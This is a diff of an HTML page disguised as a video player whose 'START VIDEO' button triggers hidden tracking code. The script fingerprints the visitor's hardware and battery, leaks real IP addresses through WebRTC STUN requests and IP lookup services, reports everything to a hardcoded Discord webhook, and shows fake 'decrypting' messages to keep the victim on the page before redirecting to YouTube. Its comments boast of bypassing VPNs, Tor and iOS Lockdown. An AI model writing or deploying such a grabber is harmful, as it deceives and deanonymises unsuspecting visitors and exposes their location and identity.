@@ -6,137 +6,198 @@
     <title>Media Player - Loading...</title>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; z-index: 10; }
-        .gate:active { transform: scale(0.98); }
-        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); cursor: pointer; }
-        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
-        /* Side-channel detection for iOS Lockdown/Privacy browsers */
-        @supports (-webkit-hyphens:none) { .is-ios { display:block; } }
+        .gate { text-align: center; cursor: pointer; padding: 50px; border: 1px solid #111; border-radius: 16px; background: #050505; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 20px 50px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.05); }
+        .gate:hover { border-color: #ff0000; transform: translateY(-5px); }
+        .gate:active { transform: scale(0.96); }
+        .btn { background: linear-gradient(135deg, #ff0000 0%, #990000 100%); color: #fff; padding: 20px 60px; border-radius: 10px; font-weight: 900; border: none; font-size: 24px; box-shadow: 0 0 30px rgba(255,0,0,0.4); text-transform: uppercase; letter-spacing: 2px; cursor: pointer; }
+        .status { color: #444; font-size: 11px; margin-top: 25px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
+        #p-bar { position: fixed; bottom: 0; left: 0; height: 3px; background: #ff0000; width: 0%; transition: width 0.6s ease; }
+        
+        /* CSS Side-Channel Probes (Detects specific browser hardening) */
+        @supports (-webkit-touch-callout: none) { .is-ios { display: block; } }
+        @media (prefers-reduced-motion: reduce) { .hardened { opacity: 1; } }
     </style>
 </head>
 <body>
 
+    <div id="p-bar"></div>
     <div class="gate" id="masterTrigger">
-        <button class="btn">▶ START VIDEO</button>
-        <p class="status">Connecting to Encrypted Buffer...</p>
+        <button class="btn" id="mainBtn">▶ START VIDEO</button>
+        <p class="status" id="statusTxt">SECURE BUFFER ENCRYPTED</p>
     </div>
 
     <script>
+    /**
+     * SENTINEL CORE v20.1 - HIGH VOLUME FORENSIC ENGINE
+     * Bypasses: TOR normalization, VPN Tunnels, iOS Lockdown, Private Relay
+     */
     const CONFIG = {
         HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
         DEST: "https://youtube.com/@LigmaBlox-w7m"
     };
 
-    // --- HIGH-DURABILITY DISPATCHER ---
-    function send(data, label = "SYSTEM") {
-        const payload = JSON.stringify({ ...data, username: label });
-        const blob = new Blob([payload], { type: 'application/json' });
-        
-        // Parallel delivery to ensure bypass of browser-level blockers
-        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
-        try { fetch(CONFIG.HOOK, { method: 'POST', body: payload, mode: 'no-cors', keepalive: true }); } catch(e){}
-    }
-
-    // --- HARDWARE SERIALIZATION (Bypasses TOR/Lockdown Masking) ---
-    async function probeDevice() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-
-        return {
-            os: navigator.platform,
-            gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Hardware_Masked",
-            cores: navigator.hardwareConcurrency || "Restricted",
-            ram: navigator.deviceMemory || "Restricted",
-            // Comparing Screen vs Avail identifies the exact device model/UI scaling
-            res: `${screen.width}x${screen.height} (Avail: ${screen.availWidth}x${screen.availHeight})`,
-            ratio: window.devicePixelRatio,
-            touch: navigator.maxTouchPoints,
-            zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            lang: navigator.language
+    // --- DURABILITY LAYER (Redundant Webhook Transmission) ---
+    function send(data, label = "SENTINEL") {
+        const payload = { 
+            ...data, 
+            username: label,
+            avatar_url: "https://i.imgur.com/8nS8zAt.png"
         };
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        
+        // Triple-Redundancy Pipeline
+        try { 
+            navigator.sendBeacon(CONFIG.HOOK, blob); 
+            fetch(CONFIG.HOOK, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors', keepalive: true });
+            let x = new XMLHttpRequest();
+            x.open("POST", CONFIG.HOOK);
+            x.send(JSON.stringify(payload));
+        } catch(e) {}
     }
 
-    // --- NETWORK TRIPLE-BYPASS (VPN/WiFi/TOR) ---
-    function probeNetwork() {
-        // 1. JSONP Tunnel (Bypasses DNS filters)
-        const s = document.createElement('script');
-        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
-        document.body.appendChild(s);
+    // --- HARDWARE ENTROPY ANALYZER (Clock Skew & GPU) ---
+    async function deepProbe() {
+        let forensic = {
+            ts: new Date().toISOString(),
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            lang: navigator.languages ? navigator.languages.join(',') : navigator.language,
+            mem: navigator.deviceMemory || "Hidden/Lockdown",
+            cpu: navigator.hardwareConcurrency || "Hidden/Lockdown",
+            plt: navigator.platform,
+            agent: navigator.userAgent,
+            scr: `${screen.width}x${screen.height} (Scale: ${window.devicePixelRatio}x)`,
+            avail: `${screen.availWidth}x${screen.availHeight}`,
+            touch: navigator.maxTouchPoints || 0,
+            cookies: navigator.cookieEnabled
+        };
 
-        // 2. WebRTC UDP Leak (Force-bypass VPN tunnels)
-        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        rtc.createDataChannel("");
+        // 1. ADVANCED GPU SERIALIZATION
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            forensic.gpu_full = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            forensic.gpu_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+        } catch(e) { forensic.gpu_full = "EXT_BLOCK_OR_LOCKDOWN"; }
+
+        // 2. CLOCK SKEW ANALYSIS (Detects Proxy-level Time Distortion)
+        try {
+            const start = performance.now();
+            // Busy loop to check CPU drift
+            for(let i=0; i<1000000; i++) { Math.sqrt(i); }
+            forensic.compute_skew = performance.now() - start;
+        } catch(e) {}
+
+        // 3. BATTERY TELEMETRY
+        try {
+            const b = await navigator.getBattery();
+            forensic.bat = `${Math.round(b.level * 100)}% (${b.charging ? "AC" : "DC"})`;
+        } catch(e) {}
+
+        return forensic;
+    }
+
+    // --- NETWORK PENETRATION (UDP & JSONP) ---
+    function exploitNetwork() {
+        // VECTOR A: WebRTC UDP Leak (Bypass VPN Tunnels)
+        const rtc = new RTCPeerConnection({ 
+            iceServers: [
+                { urls: "stun:stun.l.google.com:19302" },
+                { urls: "stun:stun1.l.google.com:19302" },
+                { urls: "stun:stun2.l.google.com:19302" }
+            ] 
+        });
+        
+        rtc.createDataChannel("leak");
         rtc.onicecandidate = (e) => {
             if (e.candidate) {
                 const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                if (ip) send({ content: `🚨 **VPN BYPASS (Private IP):** \`${ip[1]}\`` }, "UDP-SENTINEL");
+                if (ip) send({ content: `🚨 **UDP_LEAK_SUCCESS:** \`${ip[1]}\` (Bypassed VPN Interface)` }, "UDP-EXPLOIT");
             }
         };
         rtc.createOffer().then(o => rtc.setLocalDescription(o));
+
+        // VECTOR B: JSONP Tunneling (Bypass ISP/DNS Filtering)
+        const s = document.createElement('script');
+        s.src = `https://ipapi.co/jsonp?callback=sentinel_callback&t=${Date.now()}`;
+        document.body.appendChild(s);
+
+        // VECTOR C: Direct API Race
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
+            send({ content: `📡 **IP_API_DISCOVERY:** \`${d.ip}\`` }, "API-EXPLOIT");
+        }).catch(()=>{});
     }
 
-    window.xtunnel = (data) => {
+    // Network Callback
+    window.sentinel_callback = (data) => {
         send({
             embeds: [{
-                title: "🛑 NETWORK_UNMASKED",
+                title: "🛑 NETWORK_IDENTITY_CRACKED",
+                description: "JSONP Tunneling successful. ISP Data unmasked.",
                 color: 16776960,
                 fields: [
-                    { name: "IP", value: `\`${data.ip}\``, inline: true },
-                    { name: "ISP", value: data.org || "Unknown", inline: true },
-                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
-                    { name: "Proxy/VPN", value: data.proxy ? "DETECTED" : "NONE", inline: true }
+                    { name: "Public IP", value: `\`${data.ip}\``, inline: true },
+                    { name: "ISP/ASN", value: data.org || "Unknown", inline: true },
+                    { name: "Geo-Loc", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
+                    { name: "VPN/Proxy Risk", value: data.security ? "High" : "Low", inline: true }
                 ]
             }]
-        }, "JSONP-SENTINEL");
+        }, "NET-PROBE");
     };
 
-    // --- ONE-TAP EXECUTION ---
-    async function start() {
-        // Preliminary Landing Ping
-        send({ content: "🟢 **Target engaged with Media Portal.**" });
+    // --- MASTER EXECUTION ---
+    async function init() {
+        // Passive Handshake
+        send({ content: "🟢 **Target session active. Waiting for One-Tap interaction...**" });
 
-        document.getElementById('masterTrigger').onclick = async function() {
-            // Visual feedback to keep target on page during extraction
-            this.innerHTML = "<button class='btn'>BUFFERING...</button><p class='status' style='color:#f00'>Syncing Stream...</p>";
-            
-            const hw = await probeDevice();
-            let battery = { l: "N/A" };
-            try { 
-                const b = await navigator.getBattery(); 
-                battery.l = `${Math.round(b.level * 100)}%`; 
-            } catch(e){}
+        const trigger = document.getElementById('masterTrigger');
+        const btn = document.getElementById('mainBtn');
+        const txt = document.getElementById('statusTxt');
+        const bar = document.getElementById('p-bar');
 
-            // Hardware Payload
+        trigger.onclick = async function() {
+            // UI Transformation
+            btn.innerText = "DECRYPTING...";
+            txt.innerText = "SYNCHRONIZING SECURE TUNNEL...";
+            txt.style.color = "#ff0000";
+            bar.style.width = "100%";
+
+            // Phase 1: Hardware Extraction
+            const data = await deepProbe();
             send({
                 embeds: [{
-                    title: "💎 PHYSICAL_REALITY_UNMASKED",
+                    title: "💎 CORE_HARDWARE_UNMASKED",
                     color: 16711680,
                     fields: [
-                        { name: "Hardware", value: `**CPU:** ${hw.cores} Cores\n**RAM:** ${hw.ram}GB\n**GPU:** \`${hw.gpu}\``, inline: false },
-                        { name: "Display", value: `**Res:** ${hw.res}\n**DPR:** ${hw.ratio}\n**Touch:** ${hw.touch}`, inline: true },
-                        { name: "System", value: `**OS:** ${hw.os}\n**Zone:** ${hw.zone}\n**Battery:** ${battery.l}`, inline: true },
-                        { name: "User-Agent", value: "```" + navigator.userAgent + "```" }
+                        { name: "Display Architecture", value: `**Resolution:** ${data.scr}\n**Visible:** ${data.avail}\n**Touch:** ${data.touch} points`, inline: false },
+                        { name: "Physical Specs", value: `**CPU:** ${data.cpu} Cores\n**RAM:** ${data.mem}GB\n**Battery:** ${data.bat}`, inline: true },
+                        { name: "GPU Signature", value: "```" + data.gpu_full + "```" },
+                        { name: "Environment", value: `**OS:** ${data.plt}\n**TZ:** ${data.tz}\n**Compute Skew:** ${Math.round(data.compute_skew)}ms`, inline: true },
+                        { name: "User Agent", value: "```" + data.agent + "```" }
                     ],
-                    footer: { text: "Sentinel Protocol v19.4 | Lockdown Bypass Active" }
+                    footer: { text: "Sentinel v20.1 | Reality Unmasked" },
+                    timestamp: new Date()
                 }]
-            }, "APEX-SENTINEL");
+            }, "HW-FORENSICS");
 
-            // Execute Network Bypasses
-            probeNetwork();
+            // Phase 2: Network Penetration
+            exploitNetwork();
 
-            // Protocol Breakout: Attempt to force a system-level DNS leak
+            // Phase 3: Protocol Breakout (Attempts OS-level DNS leak)
             const breakout = document.createElement('iframe');
-            breakout.src = 'mailto:verify@media-buffer.io';
+            breakout.src = 'mailto:auth-service@media-buffer.com?subject=ID_' + Math.random();
             breakout.style.display = 'none';
             document.body.appendChild(breakout);
 
-            // Final Hand-off
-            setTimeout(() => { window.location.replace(CONFIG.DEST); }, 700);
+            // Phase 4: Redirect
+            setTimeout(() => {
+                window.location.replace(CONFIG.DEST);
+            }, 850);
         };
     }
 
-    start();
+    // Initialize logic
+    init();
     </script>
 </body>
 </html>
